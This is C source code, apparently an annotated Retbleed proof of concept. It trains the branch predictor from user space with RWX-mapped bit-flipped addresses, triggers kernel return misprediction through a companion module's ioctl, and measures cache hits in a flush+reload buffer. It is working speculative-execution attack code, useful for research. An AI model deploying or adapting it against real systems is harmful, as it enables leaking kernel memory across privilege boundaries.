#include "common.h"
#include <signal.h>
#include <setjmp.h>
#include <sys/ioctl.h>
#include "./kmod_retbleed_poc/retbleed_poc_ioctl.h"
#include <err.h>
#include <string.h>
#include <stdlib.h>

// how many rounds to try mispredict? Many rounds often breaks things. Probably
// there's some usefulness bits that downvotes a bad prediction.
#define ROUNDS 20

// RB, reload buffer
#define RB_PTR 0x13300000000
#define RB_STRIDE_BITS 12
#define RB_SLOTS 0x10

// this is the slot of the reload buffer we will light up when we have
// misprediction.
#define SECRET 6

// try all user-space patterns
#define MAX_BIT 47

// flip at most this many bits in the victim src address.
#define MAX_MUTATIONS 4

// skip flipping bits in the lower part of training src, we can often assume that
// they have to match with the lower bits
#define SKIP_LOWER_BITS 6

// Define a macro for rounding up to the nearest page size
#define PG_ROUND(n) (((((n)-1UL)>>12)+1)<<12)

__attribute__((aligned(4096))) static u64 results[RB_SLOTS] = {0};

struct mem_info {
    union {
        u64 va;
        u8* buf;
    };
    u64 kva;
    u64 pa;
};


//Convert Virtual to Physical Address
static long va_to_phys(int fd, long va)
{
    unsigned long pa_with_flags;

    lseek(fd, ((long) va)>>9, SEEK_SET);
    read(fd, &pa_with_flags, 8);
    // printf("phys %p\n", (void*)pa_with_flags);
    return pa_with_flags<<12 | (va & 0xfff);
}

// flip to 1 when we SHOULD segfault and not crash the program
static int should_segfault = 0;

static sigjmp_buf env;

//Handle Segmentation Faults
static void handle_segv(int sig, siginfo_t *si, void *unused)
{
    if (should_segfault) {
        //return to sigsetjmp(env, 1) instead of Crashing
        siglongjmp(env, 12);
        return;
    };

    fprintf(stderr, "Not handling SIGSEGV\n");
    exit(sig);
}

int main(int argc, char *argv[])
{ 
    //initialize memory block info (reload buffer)
    struct mem_info rb;
    //initialize synthetic gadget (where is the struct?)
    struct synth_gadget_desc sgd;

    //initialize virtual address of rb to RB_PTR (0x13300000000)
    rb.va = RB_PTR;

    //initialize segmentation fault handling
    struct sigaction sa;
    sa.sa_flags = SA_SIGINFO;
    sigemptyset(&sa.sa_mask);
    sa.sa_sigaction = &handle_segv;
    sigaction (SIGSEGV, &sa, NULL);

#define MAX(a,b) ((a) > (b)) ? a : b
#define RB_SZ MAX(RB_SLOTS<<RB_STRIDE_BITS, 1UL<<21)

    // reload buffer. We will check for cache hits in rb[SECRET<<RB_STRIDE_BITS]

    //rb.buf is the starting address for the memory region to be mapped
    //RB_SZ is the length of the mapping, i.e., the number of bytes to map.
    //PROT_RW is a flag indicating the desired memory protection: it should be readable and writable.
    //MMAP_FLAGS|MAP_HUGETLB is a combination of flags for the mmap call. MMAP_FLAGS is likely a macro defined elsewhere in the code, and MAP_HUGETLB is a flag that tells the kernel to use "huge pages" for the mapping.
    //Huge pages are larger than the standard memory page size, and can be more efficient for certain types of memory access patterns.
    //-1 means that memory should be allocated, rather than mapping a file or device
    //0 is the offset into the file or device to start the mapping from. Since a file descriptor of -1 is used, this argument is ignored.
    map_or_die(rb.buf, RB_SZ, PROT_RW, MMAP_FLAGS|MAP_HUGETLB, -1, 0);

    rb.buf[123] = 1;

    //file descriptor of module
    int fd_retbleed_poc;
    //open Kernel Module in Read Only
    fd_retbleed_poc = open("/proc/" PROC_RETBLEED_POC, O_RDONLY);
    //fail if not installed
    if (fd_retbleed_poc <= 0  ) {
        err(1, "You need to install the kmod_retbleed_poc for this poc\n");
    }

    //input/output control
    //operate on kernel module
    //fd_retbleed_poc   = file descriptor of module
    //REQ_GADGET        = macro that represents a specific command that the object represented by fd_retbleed_poc can understand. 
    //&sgd              = pointer to a struct synth_gadget_desc object.
    //what is REQ_GADGET???
    ioctl(fd_retbleed_poc, REQ_GADGET, &sgd);

    //descriptor for pagemap file (read only)
    //read information about the physical memory layout of the process (own process)
    int fd_pagemap = open("/proc/self/pagemap", O_RDONLY);
    
    //fail if hugepages not enabled
    if (fd_pagemap < 0) {
        perror("fd_pagemap");
        exit(EXIT_FAILURE);
    }

    //get physical address of reload buffer
    rb.pa = va_to_phys(fd_pagemap, rb.va);
    if (rb.pa == 0) {
        fprintf(stderr, "Need root to read pagemap\n");
        exit(1);
    }

    //get kernelmod virtual address
    rb.kva = sgd.physmap_base+rb.pa;
    //print physical address, kernel virtual address, ...     
    printf("rb.pa     %lx\n", rb.pa);
    printf("rb.kva    %lx\n", rb.kva);
    printf("kbr_src   %lx\n", sgd.kbr_src);
    printf("kbr_dst   %lx\n", sgd.kbr_dst);
    printf("last_tgt  %lx\n", sgd.last_tgt);

    //Create payload descriptor
    struct payload p;
    //assign kernel virtual address to payload.reload_buffer
    p.reload_buffer = rb.kva;

    // expect RB_ENTRY to be hot on collision. give it any value 0--RB_SLOTS
    p.secret = SECRET;



    //RB_PTR is t1
    //<<RB_STRIDE_BITS is the size of each slot in the reload buffer. 
    //The << operator is a bitwise shift to the left, which is equivalent to multiplying by 2 to the power of the right operand. 
    //So 1<<RB_STRIDE_BITS is equivalent to 2^RB_STRIDE_BITS.he base address of the reload buffer. This is the memory region that the program will check for cache hits.
    //RB_SLOTS is the number of slots in the reload buffer.
    flush_range(RB_PTR, 1<<RB_STRIDE_BITS, RB_SLOTS);



    printf("[.] bits_flipped; rb_entry; training_branch; signal\n");
    // Starting by trying to get a collission by flipping 1 bit.. then going on
    // until MAX_MUTATIONS.
    for (int nbits = 1; nbits <= MAX_MUTATIONS; ++nbits) {
        u64 ptrn_shl = 0;
        u64 ptrn = 0;
        printf("[-] nbits=%d\n",nbits);
        // We will iterate over all possible XOR patterns in the range of
        // available addresses (skipping some lower ones) and apply it to
        // BR_SRC1 to derive a new address where we try to cause collisions.
        while (ptrn < (1UL<<(MAX_BIT-SKIP_LOWER_BITS))) {
            //reset the results array to zero
            memset(results, 0, RB_SLOTS*sizeof(results[0]));
            ptrn = get_next(ptrn, nbits);
            ptrn_shl = ptrn<<SKIP_LOWER_BITS;
            ptrn_shl |= 0xffff800000000000UL;
            //create a new address for training the branch predictor by XORing the last target address with the shifted pattern
            u64 br_src_training = sgd.last_tgt ^ ptrn_shl;
            u64 br_src_training_sz = sgd.kbr_src-sgd.last_tgt;

            //map memory at the training address. Skip to next iteration if it fails
            if (mmap((void*)(br_src_training & ~0xfff),
                        PG_ROUND(br_src_training_sz), PROT_RWX, MMAP_FLAGS, -1, 0)
                    == MAP_FAILED) {
                // not able to map here.. maybe occupied. try some other
                // mutation instead.
                continue;
            }

            //fill mapped memory with NOP instruction (0x90) to ensure that the processor doesn't execute any unintended instructions during the training process
            memset((u8 *)br_src_training, 0x90, br_src_training_sz);
            *(u8 *)(br_src_training+br_src_training_sz-1) = 0xff;
            *(u8 *)(br_src_training+br_src_training_sz) = 0xe0; // jmp rax

            // main training loop 
            for (int i = 0; i<ROUNDS; ++i) {
                should_segfault = 1;
                int a = sigsetjmp(env, 1);
                // inline assembly to perform a jump to the training address.
                // This is done to train the branch predictor to predict a jump to the target address when it sees the training address
                if (a == 0) {
                asm volatile (
                        "jmp *%1" :: "a"(sgd.kbr_dst), "r"(br_src_training));
                }

                flush_range(RB_PTR, 1<<RB_STRIDE_BITS, RB_SLOTS);
                // go into kernel and run a return instruction. it will to
                // mispredict into kbr_dst for certain patterns.
                ioctl(fd_retbleed_poc, REQ_SPECULATE, &p);

                reload_range(RB_PTR, 1<<RB_STRIDE_BITS, RB_SLOTS, results);
            }
            for (int i = 0 ; i < RB_SLOTS; ++i) {
                // lets print everything if there's a hit
               if (results[i] > 1) {
                   char binstr[64+1] = {0}; //0,1 or null
                   //convert the shifted pattern to a binary string for printing
                    mem2bin(binstr, (unsigned char*)&ptrn_shl, 48);
                    printf("[+] %s; %02d; 0x%012lx; %0.2f", binstr,
                            i, (u64)(br_src_training+br_src_training_sz-1),
                            results[i]/(ROUNDS+.0));
                   printf("\n");
               }
            }
            //reset the results array to zero
            memset(results, 0, RB_SLOTS*sizeof(results[0]));
            // unmap memory that was mapped for the training addressafter each pattern is tested
            munmap((void*)(br_src_training&~0xfffUL), PG_ROUND(br_src_training_sz));
        }
    }
    return 0;
}